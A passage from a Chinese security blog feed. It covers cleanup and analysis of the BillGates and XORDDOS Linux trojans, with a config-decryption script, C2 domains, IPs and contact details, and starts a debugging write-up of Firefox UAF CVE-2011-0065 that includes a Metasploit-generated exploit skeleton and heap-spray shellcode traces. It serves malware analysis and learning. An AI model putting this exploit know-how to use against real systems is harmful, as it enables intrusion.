class="number">5</span>].d/S99selinux                              自启动配置文件，直接删除</span><br><span class="line">/etc/conf.n                                            木马残留文件直接删                                                  </span><br><span class="line">/etc/cmd.n                                             木马残留脚本，直接删除</span><br><span class="line">/usr/lib/libamplify.so                                 木马残留可执行文件直接删除</span><br><span class="line">/usr/bin/bsd-port/conf.n                               木马残留文件直接删除</span><br><span class="line">/tmp<span class="comment">/*.lock</span><br><span class="line">/tmp/moni.lod</span><br><span class="line">/tmp/gates.lod</span></span><br></pre></td></tr></table></figure><br><br><strong>恢复</strong><br>替换的命令都是一些系统进程网络文件等检测系统异常的命令，不过好在进过分析这些命令都被备份/usr/bin/dpkgd/目录下，我们只需要将木马命令删除然后放回去就好了，实在不放心可以从一台正常的主机上拷贝这些命令。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">/bin/netstat</span><br><span class="line">/bin/lsof</span><br><span class="line">/bin/ps</span><br><span class="line">/usr/bin/netstat</span><br><span class="line">/usr/bin/lsof</span><br><span class="line">/usr/bin/ps</span><br><span class="line">/usr/sbin/netstat</span><br><span class="line">/usr/sbin/lsof</span><br><span class="line">/usr/sbin/ps</span><br></pre></td></tr></table></figure><br><br>其他查杀参考:<br><a href="http://www.cnblogs.com/kerrycode/p/4754820.html" target="_blank" rel="external">记一次Linux服务器上查杀木马经历</a><br><br>## XORDDOS<br><div align="center"><br><img src="/img/20160826fireEye_XORDDO.png" alt="XOR木马DDOS攻击流程--fireeye" align="center"><br></div><br>### 静态分析<br>基本信息<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">root@backbox-virtual-machine:/home/backbox/Desktop/ctf# md5sum ylsfwpisem </span><br><span class="line">fb7991805655eb06e4380c1f703f0dcb  ylsfwpisem</span><br><span class="line">root@backbox-virtual-machine:/home/backbox/Desktop/ctf# file ylsfwpisem </span><br><span class="line">ylsfwpisem: ELF 32-bit LSB  executable, Intel 80386, version 1 (SYSV), statically linked, for GNU/Linux 2.6.9, not stripped</span><br><span class="line">root@backbox-virtual-machine:/home/backbox/Desktop/ctf# readelf -a ylsfwpisem |grep FILE|awk '&#123;print $8&#125;'|sort -u</span><br><span class="line">autorun.c</span><br><span class="line">buildnet.c</span><br><span class="line">crc32.c</span><br><span class="line">crtstuff.c</span><br><span class="line">dns.c</span><br><span class="line">encrypt.c</span><br><span class="line">execpacket.c</span><br><span class="line">findip.c</span><br><span class="line">hide.c</span><br><span class="line">http.c</span><br><span class="line">kill.c</span><br><span class="line">main.c</span><br><span class="line">proc.c</span><br><span class="line">socket.c</span><br><span class="line">tcp.c</span><br><span class="line">thread.c</span><br></pre></td></tr></table></figure><br><br>和BillGates一样，XOR也是32位的静态链接的elf文件同时有我们喜欢的符号信息，但是从源文件来看就有些不同了，首先源文件数量较少（XOR大小为648k，BillGates有差不多1.2M）而且是C语言来写的，看这些命名就感觉很亲切看网上说好像是中国人写得，难怪哈哈。从名称来看有自启动、tcp、隐藏加密等功能所以可以看出xor相比BillGates要简单并且好分析得多。<br><br><em>由于最近事情比较多这里就没写了，可以看参考链接，比较详细基本相似</em><br>xor ddos字符解密脚本<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">#-*- coding:utf-8 -*-</span><br><span class="line">#dec_conf.py</span><br><span class="line">#xorddos 解密脚本</span><br><span class="line"></span><br><span class="line">import os</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">def dec_conf(payload):</span><br><span class="line">	key="BB2FA36AAA9541F0"</span><br><span class="line">	dec_payload=[]</span><br><span class="line">	for i in range(len(payload)):</span><br><span class="line">		dec_payload.append(chr(ord(payload[i])^ord(key[i%len(key)])))</span><br><span class="line">	print ''.join(dec_payload)</span><br><span class="line"></span><br><span class="line">if __name__=='__main__':</span><br><span class="line">	dec_conf(sys.argv[1])</span><br><span class="line"></span><br><span class="line">char xorkeys[17]="BB2FA36AAA9541F0";</span><br><span class="line">void *__cdecl encrypt_code(void *buf, int count)</span><br><span class="line">&#123;</span><br><span class="line">	char *p; // [sp+4h] [bp-Ch]@1</span><br><span class="line">	signed int i; // [sp+8h] [bp-8h]@1</span><br><span class="line"></span><br><span class="line">	p = (char *)buf;</span><br><span class="line">	i = 0;</span><br><span class="line">	while ( i &lt; count )</span><br><span class="line">	&#123;</span><br><span class="line">		*p ^= xorkeys[i++ % 16];</span><br><span class="line">		++p;</span><br><span class="line">	&#125;</span><br><span class="line">	return buf;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><br>### 动态分析<br><br><a href="http://www.cnblogs.com/goabout2/p/4888669.html" target="_blank" rel="external">linux xorddos样本分析2</a><br><br><div align="center"><br><img src="/img/20160826_XORDDOS_backaddr.png" alt="xorddos样本后台地址" align="center"><br></div>

<p>样本后台地址godaddy.gdgaoxiang.com:5858|119.147.145.216:2897,可以看到这个域名想冒充godaddy这个域名服务商，</p>
<div align="center"><br><img src="/img/20160826billgates_XORDDOS_mail.png" align="center"><br></div><br><div align="center"><br><img src="/img/20160826billgates_XORDDOS_mail2.png" align="center"><br></div><br><div align="center"><br><img src="/img/20160826billgates_XORDDOS_mail3.png" alt="gdgaoxiang.com域名及ip威胁情报信息" align="center"><br></div>

<p>域名godaddy.gdgaoxiang.com的威胁情报分析看还比较赶紧没什么做坏事的痕迹，但是ip地址的威胁情报分析来看就是劣迹累累，与这个域名相关的病毒不仅有ddos还有最近流行的敲诈勒索软件Tescrypt。<br>相关情报如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">info1<span class="number">.300</span></span><br><span class="line">godaddy.gdgaoxiang.com</span><br><span class="line">www.gdgaoxiang.com</span><br><span class="line">ly70cc.gdgaoxiang.com</span><br><span class="line">ftp.gdgaoxiang.com</span><br><span class="line">yueliang1235@gmail.com</span><br><span class="line">cs@<span class="number">0662.</span>com.cn</span><br><span class="line">gd500d@<span class="number">126.</span>com</span><br><span class="line"><span class="number">13326596866</span> </span><br><span class="line"><span class="number">1774930466</span>@qq.com</span><br><span class="line">game000123.com</span><br><span class="line">hmgyddos.game8888888.com</span><br></pre></td></tr></table></figure></p>
<h3 id="清理">清理</h3><p>可能的木马文件目录<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/[<span class="number">10</span> random characters a-z]</span><br><span class="line">/etc/init.d/[<span class="number">10</span> random characters a-z]</span><br><span class="line">/usr/bin/[Session ID]</span><br><span class="line">/etc/init.d/[Session ID]</span><br><span class="line">/etc/rc1.d/S90[Session ID]</span><br><span class="line">/etc/rc2.d/S90[Session ID]</span><br><span class="line">/etc/rc3.d/S90[Session ID]</span><br><span class="line">/etc/rc4.d/S90[Session ID]</span><br><span class="line">/etc/rc5.d/S90[Session ID]</span><br><span class="line">/etc/rc.d/rc1.d/S90[Session ID]</span><br><span class="line">/etc/rc.d/rc2.d/S90[Session ID]</span><br><span class="line">/etc/rc.d/rc3.d/S90[Session ID]</span><br><span class="line">/etc/rc.d/rc4.d/S90[Session ID]</span><br><span class="line">/etc/rc.d/rc5.d/S90[Session ID]</span><br><span class="line">/var/run/sftp.pid</span><br><span class="line">/var/run/udev.pid</span><br><span class="line">/var/run/mount.pid</span><br><span class="line">/etc/cron.hourly/cron.sh</span><br><span class="line">/etc/cron.hourly/udev.sh</span><br><span class="line">/etc/crontab</span><br><span class="line">/etc/cron.hourly/udev.sh</span><br><span class="line">/lib/libgcc.so</span><br><span class="line">/lib/libgcc.so.bak</span><br><span class="line">/lib/libgcc4.so</span><br><span class="line">/lib/libgcc4<span class="number">.4</span>.so</span><br><span class="line">/lib/udev/udev</span><br><span class="line">/lib/udev/debug</span><br></pre></td></tr></table></figure></p>
<h2 id="清理及监控">清理及监控</h2><p><a href="https://github.com/JoyChou93/kill_ddos_backdoor" target="_blank" rel="external">kill_ddos_backdoor</a><br><a href="https://github.com/ValdikSS/billgates-botnet-tracker" target="_blank" rel="external">billgates-botnet-tracker</a></p>
<h2 id="主要参考资料">主要参考资料</h2><p><a href="http://news.drweb.cn/show/?i=230&amp;" target="_blank" rel="external">Linux.BackDoor.Gates.5——又一针对Linux的木马</a><br><a href="http://www.freebuf.com/articles/92289.html" target="_blank" rel="external">某僵尸网络被控端恶意样本分析</a><br><a href="https://security.tencent.com/index.php/blog/msg/83" target="_blank" rel="external">云端博弈——木马屠城</a><br><a href="http://bartblaze.blogspot.com/2015/09/notes-on-linuxxorddos.html" target="_blank" rel="external">Notes on Linux/Xor.DDoS</a><br><a href="https://www.fireeye.com/blog/threat-research/2015/02/anatomy_of_a_brutef.html" target="_blank" rel="external">ANATOMY OF A BRUTE FORCE CAMPAIGN: THE STORY OF HEE THAI LIMITED</a><br><a href="http://www.cnblogs.com/goabout2/p/4888651.html" target="_blank" rel="external">linux xorddos样本分析1</a><br><a href="https://www.akamai.com/us/en/multimedia/documents/state-of-the-internet/bill-gates-botnet-threat-advisory.pdf#pdfjs.action=download" target="_blank" rel="external">bill-gates-botnet-threat-advisory</a></p>
<p><em>20161031更新–腾讯电脑管家的分析主要利用了其他几种工具</em><br><a href="http://www.freebuf.com/articles/system/117823.html" target="_blank" rel="external">Linux平台“盖茨木马”分析</a></p>
<p><em>20161104更新</em><br><a href="http://www.antiy.com/response/EQUATIONS/EQUATIONS.html" target="_blank" rel="external">从“方程式”到“方程组”EQUATION攻击组织高级恶意代码的全平台能力解析</a></p>
]]></content>
    <summary type="html">
    <![CDATA[<div align="center"><br><img src="/img/20160826billgates_XORDDOSsumary.png" align="center"/><br></div>

<p>分析工具：</p>
<ul>
<li>ida pro</li>
<li>edb</li>
<li>strace</li>
</ul>
<p>事情是这样的，某一天发现某一台服务器数据流量异常，怀疑中了木马而且是一台Windows机器，想着就能一展我手动杀毒的技能了，但是开了机才发下这台机器上通过Hyper-V装了另外5台虚拟机，比我想象中复杂多了而且在机房狭小的环境中。在几台Windows机器上找了良久也未发现木马的踪迹，难道是什么高级木马？好在师兄经验丰富一想肯定是剩下的那台centos有问题，果然一找一大堆，billgates附送个xorddos，不是说linux很安全么，怎么会中马呢？ linux是很安全但是耐不住用的人没安全意识啊，直接暴露在公网的主机被设置了ssh弱密码。好了故事编完了，进入正题，这篇博客主要是这两天的linux系统下的木马分析与查杀的一个简单记录。</p>
<h2 id="BillGates">BillGates</h2><p>BillGates就是上面那个比重最大的Linux.BackDoor.Gates.5，2014年就被drweb曝光过，网上很多分析的很多了，但是还是自己跟着走一遍还是能学到很多东西的，特别是第一次分析Linux木马的我。</p>
<h3 id="静态分析">静态分析</h3><p>基本信息<br>]]>
    
    </summary>
    
      <category term="Linux" scheme="http://www.youngroe.com/tags/Linux/"/>
    
      <category term="Malware" scheme="http://www.youngroe.com/tags/Malware/"/>
    
      <category term="Learning" scheme="http://www.youngroe.com/categories/Learning/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[漏洞调试-释放重引用UAF-cve-2011-0065]]></title>
    <link href="http://www.youngroe.com/2016/07/27/Debug/debug-vulner-UAF-2011-0065/"/>
    <id>http://www.youngroe.com/2016/07/27/Debug/debug-vulner-UAF-2011-0065/</id>
    <published>2016-07-27T10:57:32.000Z</published>
    <updated>2020-02-15T07:54:24.199Z</updated>
    <content type="html"><![CDATA[<p>##实验环境<br>操作系统：Windows xp、<br>辅助环境: MetaSploit、Windbg</p>
<p>##准备<br>继续漏洞分析学习，上次分析了0158之后就买了泉哥的漏洞战争，很详细很nice，不用到处去找了就跟着书上流程走就可以了。</p>
<p>###样本生成<br>虽然书的配套资料有样本，但是还是按照之前的流程用MetaSploit生成了漏洞利用样本，然后用python写了个小脚本把样本存下来了（主要是ruby写的利用代码，不怎么看得懂用浏览器访问也不好存）。python脚本和漏洞样本如下<br><a id="more"></a><br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">#coding=utf-8</span><br><span class="line">import sys</span><br><span class="line">import urllib,urllib2</span><br><span class="line"></span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding('utf-8')</span><br><span class="line">url = 'http://192.168.168.112:8080/ZWmm2Ia'</span><br><span class="line">headers = &#123; 'Host':'192.168.17.112:8080',</span><br><span class="line">'Connection':'keep-alive',</span><br><span class="line">'Cache-Control':'max-age=0',</span><br><span class="line">'Accept': 'text/html, */*; q=0.01',</span><br><span class="line">'X-Requested-With': 'XMLHttpRequest',</span><br><span class="line">'User-Agent': 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2.16) Gecko/20110319 Firefox/3.6.16',</span><br><span class="line">'DNT':'1',</span><br><span class="line">'Accept-Encoding': 'gzip,deflate',</span><br><span class="line">'Accept-Language': 'zh-CN,zh;q=0.8,ja;q=0.6'</span><br><span class="line">&#125;</span><br><span class="line">data = None</span><br><span class="line">req = urllib2.Request(url, data, headers)</span><br><span class="line">response = urllib2.urlopen(req)</span><br><span class="line">html=response.read()</span><br><span class="line">print html</span><br><span class="line">fh=open('cve_2011_0065_exploit.html','w')</span><br><span class="line">fh.write(html)</span><br><span class="line">fh.close()</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">  &lt;object id="d"&gt;&lt;object&gt;</span><br><span class="line">  &lt;applet code="LMFDNKvmiUOMb.class" width=0 height=0&gt;&lt;/applet&gt;</span><br><span class="line">  &lt;script type="text/javascript"&gt;</span><br><span class="line">                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  </span><br><span class="line"></span><br><span class="line">  &lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p>
<p>这里生成的漏洞利用样本是通过Heap Spray方法布局内存，有通过ROP绕过DEP功能。最后效果是弹出计算器。</p>
<p>###调试环境准备</p>
<ul>
<li>为了方便调试可设置Image File Execution Options注册表项，方便windbg打开自动调试(设置html为firefox自动打开，打开漏洞样本时候就自动断下来了)</li>
<li>设置好符号路径后没有按照预想的自动下载xul.dll的符号文件pdb(可能是网络问题)，可以通过symchk程序找到该符号的链接。比如xul是<a href="http://symbols.mozilla.org/firefox/xul.pdb/04477C20855F439CBD58C311613D2AA92/xul.pdb，那在firefox符号的地址就是http://symbols.mozilla.org/firefox/xul.pdb/04477C20855F439CBD58C311613D2AA92/xul.pd_(pdb在服务器上是压缩的，所以下载下来要解压)" target="_blank" rel="external">http://symbols.mozilla.org/firefox/xul.pdb/04477C20855F439CBD58C311613D2AA92/xul.pdb，那在firefox符号的地址就是http://symbols.mozilla.org/firefox/xul.pdb/04477C20855F439CBD58C311613D2AA92/xul.pd_(pdb在服务器上是压缩的，所以下载下来要解压)</a></li>
<li>没有符号调试是很痛苦的，开始就是不知道什么原因xul.dll的符号信息一直下载失败，折腾了好久才下载成功</li>
</ul>
<div align="center"><br><img src="/img/20160727debugenv.png" alt="调试环境设置好是这个样子的" align="center"><br></div>

<p>##调试</p>
<h3 id="尝试通过exp调试找到漏洞相关函数失败">尝试通过exp调试找到漏洞相关函数失败</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; bu kernel32!winexec</span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; bl</span><br><span class="line"> <span class="number">0</span> e <span class="number">7</span>c8623ad     <span class="number">0001</span> (<span class="number">0001</span>)  <span class="number">0</span>:**** kernel32!WinExec</span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; g</span><br><span class="line">Breakpoint <span class="number">0</span> hit</span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; k</span><br><span class="line">ChildEBP RetAddr  </span><br><span class="line"><span class="number">0</span>c000385 <span class="number">00000000</span> kernel32!WinExec</span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; dd esp</span><br><span class="line"><span class="number">0</span>c000034  <span class="number">0</span>c000418 <span class="number">0</span>c000437 <span class="number">00000001</span> <span class="number">93</span>d6f997</span><br><span class="line"><span class="number">0</span>c000044  <span class="number">42904f</span>97 <span class="number">274f</span>4341 <span class="number">46f</span>c9f2f <span class="number">99903f</span>98</span><br><span class="line"><span class="number">0</span>c000054  <span class="number">9f</span>969842 <span class="number">37</span>d6f541 <span class="number">9746434</span>a <span class="number">98f</span>54b48</span><br><span class="line"><span class="number">0</span>c000064  f84bf598 <span class="number">964</span>a4a99 <span class="number">49489698</span> d6489341</span><br><span class="line"><span class="number">0</span>c000074  <span class="number">4</span>b4ffc9f <span class="number">9</span>b3797f8 d6fcd637 <span class="number">90484799</span></span><br><span class="line"><span class="number">0</span>c000084  <span class="number">4e4</span>af99f <span class="number">904327f</span>d <span class="number">402f</span>2f98 <span class="number">979</span>b4141</span><br><span class="line"><span class="number">0</span>c000094  <span class="number">91499847</span> <span class="number">92f</span>d914f <span class="number">913f</span>9846 <span class="number">984746f</span>8</span><br><span class="line"><span class="number">0</span>c0000a4  <span class="number">41404</span>bfc f541f596 <span class="number">903f</span>4292 <span class="number">3f</span>2792d6</span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; da <span class="number">0</span>c000437</span><br><span class="line"><span class="number">0</span>c000437  <span class="string">"calc.exe"</span></span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; ub <span class="number">0</span>c000418</span><br><span class="line"><span class="number">0</span>c000403 <span class="number">8</span>b12            mov     edx,dword ptr [edx]</span><br><span class="line"><span class="number">0</span>c000405 eb8d            jmp     <span class="number">0</span>c000394</span><br><span class="line"><span class="number">0</span>c000407 <span class="number">5</span>d              pop     ebp</span><br><span class="line"><span class="number">0</span>c000408 <span class="number">6</span>a01            push    <span class="number">1</span></span><br><span class="line"><span class="number">0</span>c00040a <span class="number">8</span>d85b2000000    lea     eax,[ebp+<span class="number">0</span>B2h]</span><br><span class="line"><span class="number">0</span>c000410 <span class="number">50</span>              push    eax</span><br><span class="line"><span class="number">0</span>c000411 <span class="number">68318</span>b6f87      push    <span class="number">876F</span>8B31h</span><br><span class="line"><span class="number">0</span>c000416 ffd5            call    ebp        <span class="comment">//这里调用winexec</span></span><br><span class="line"><span class="comment">//在0c00040a指令之前的全部都是滑板指令</span></span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; !address <span class="number">0</span>c000416</span><br><span class="line">Usage:                  &lt;unclassified&gt;</span><br><span class="line">Allocation Base:        <span class="number">0</span>c000000</span><br><span class="line">Base Address:           <span class="number">0</span>c000000</span><br><span class="line">End Address:            <span class="number">0</span>c001000</span><br><span class="line">Region Size:            <span class="number">00001000</span></span><br><span class="line">Type:                   <span class="number">00020000</span>	MEM_PRIVATE</span><br><span class="line">State:                  <span class="number">00001000</span>	MEM_COMMIT</span><br><span class="line">Protect:                <span class="number">00000040</span>	PAGE_EXECUTE_READWRITE</span><br></pre></td></tr></table></figure>
<p>直接通过exploit来找uaf漏洞函数感觉不好找，又没什么经验所以还是按照书里步骤来吧</p>
<h3 id="正向调试及漏洞利用简单分析，直接按书上步骤调试">正向调试及漏洞利用简单分析，直接按书上步骤调试</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span 